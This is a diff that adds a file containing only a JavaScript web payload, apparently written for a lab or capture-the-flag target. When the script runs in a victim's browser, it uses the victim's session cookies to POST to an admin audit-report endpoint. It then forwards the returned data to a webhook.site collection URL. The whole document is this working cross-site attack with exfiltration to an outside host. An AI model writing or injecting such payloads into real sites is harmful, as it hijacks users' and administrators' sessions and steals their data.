@@ -1,0 +1,13 @@
+<script>
+  fetch('http://154.57.164.78:32480/api/admin/audit/report', {
+  method: 'POST',
+  credentials: 'include',
+  headers: {
+    'Content-Type': 'application/json',
+    'Origin': 'http://154.57.164.78:32480'
+  },
+  body: JSON.stringify({ userField: 'email', userValue: 'your@email.com' })
+})
+.then(r => r.json())
+.then(data => fetch('https://webhook.site/7b78617d-d4d8-42b6-bf48-07397642cafd', { method: 'POST', body: JSON.stringify(data) }));
+</script>
